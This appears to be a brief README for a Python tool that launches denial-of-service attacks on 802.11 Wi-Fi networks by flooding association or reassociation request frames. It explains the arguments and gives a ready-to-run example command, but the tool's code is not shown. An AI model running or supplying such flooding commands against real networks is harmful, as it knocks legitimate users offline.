DoS attacks on 802.11 networks with flooding desired packets.

``` 
usage: test.py -src SOURCE_ADDRESS -dst DESTINATION_ADDRESS -p {assocReq} [-c COUNT] -i INTERFACE [-ssid 
SSID]. 
```

- Give mac address of the client and the AP as src and dst
- Packet type can be either "assocReq" or "reassocReq"
- -i as interface name example "wlan0mon"

common example
```
python test.py -src 00:00:00:00:00:00 -dst 00:00:00:00:00:00 -i wlan0mon -p assocReq -c 100 -ssid "aristaSSID"
```